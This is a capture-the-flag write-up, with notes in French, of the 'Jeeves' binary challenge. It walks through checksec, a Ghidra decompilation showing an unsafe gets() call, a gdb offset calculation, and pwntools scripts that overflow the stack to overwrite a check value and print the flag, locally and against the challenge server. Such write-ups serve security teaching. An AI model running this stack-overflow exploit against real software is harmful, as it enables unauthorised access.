\chapter{Jeeves}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}

\begin{verbatim}
$ pwntools-pwn checksec jeeves
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
\end{verbatim}

\begin{verbatim}
$ ./jeeves
Hello, good sir!
May I have your name? sure
Hello sure, hope you have a good day!

$ ./jeeves
Hello, good sir!
May I have your name? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, hope you have a good day!
Segmentation fault (core dumped)

\end{verbatim}

\section{Ghidra}
\begin{verbatim}
undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;

  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
\end{verbatim}

ok donc avec le buffer overflow on va aller jusqu'a ecraser la valeur de
\verb+local_c+
\section{gdb}

\begin{verbatim}
gef>  disas main
Dump of assembler code for function main:
   0x00000000000011e9 <+0>:     endbr64
   0x00000000000011ed <+4>:     push   rbp
   0x00000000000011ee <+5>:     mov    rbp,rsp
   0x00000000000011f1 <+8>:     sub    rsp,0x40
   0x00000000000011f5 <+12>:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
   0x00000000000011fc <+19>:    lea    rdi,[rip+0xe05]        # 0x2008
   0x0000000000001203 <+26>:    mov    eax,0x0
   0x0000000000001208 <+31>:    call   0x10a0 <printf@plt>
   0x000000000000120d <+36>:    lea    rax,[rbp-0x40]
   0x0000000000001211 <+40>:    mov    rdi,rax
   0x0000000000001214 <+43>:    mov    eax,0x0
   0x0000000000001219 <+48>:    call   0x10d0 <gets@plt>
   0x000000000000121e <+53>:    lea    rax,[rbp-0x40]
   0x0000000000001222 <+57>:    mov    rsi,rax
   0x0000000000001225 <+60>:    lea    rdi,[rip+0xe04]        # 0x2030
   0x000000000000122c <+67>:    mov    eax,0x0
   0x0000000000001231 <+72>:    call   0x10a0 <printf@plt>
   0x0000000000001236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
   0x000000000000123d <+84>:    jne    0x12a8 <main+191>
\end{verbatim}

donc \verb+local_c+ est a \verb+[rbp-0x4]+ alors que buffer est à 
\verb+[rbp-0x40]+ => 60 chars avant d'atteindre \verb+local_c+

\section{Exploit}

\subsection{local}
\begin{verbatim}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntools-pwn template jeeves
from pwn import *

payload = b'A' * 60
payload += p64(0x1337bab3)

context.binary = './jeeves'

p = process()
what = p.recvline()
print(f'what did you say: {what}')
p.sendline(payload)
what = p.clean()
print(what)
\end{verbatim}

en run local:
\begin{verbatim}
$ ./pwn-jeeves.py
what did you say: b'Hello, good sir!\n'
[*] Process 'binary_track/jeeves/jeeves' stopped with exit code 0 (pid 2669652)
b"May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!\nPleased to make your acquaintance. Here's a small gift: \n"
\end{verbatim}

donc maintenant il faut reecrire pour le call réseau.

\subsection{Remote}

Par contre après essai le
serveur attend directement la chaine sans rien demander.

\begin{verbatim}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntools-pwn template --host 134.209.22.69 --port 31905
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.62.84.158'
port = int(args.PORT or 31115)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

payload = b'A' * 60
payload += p64(0x1337bab3)

io = start()
io.sendline(payload)
what = io.recvline()
print(f'what did you say: {what}')
io.sendline(payload)
what = io.clean()
print(what)
\end{verbatim}

\begin{verbatim}
$ sudo ./pwn-jeeves-net.py
[+] Opening connection to 178.62.84.158 on port 31115: Done
what did you say: b'Hello, good sir!\n'
b"May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!\nPleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}\n\n"
[*] Closed connection to 178.62.84.158 port 31115
\end{verbatim}
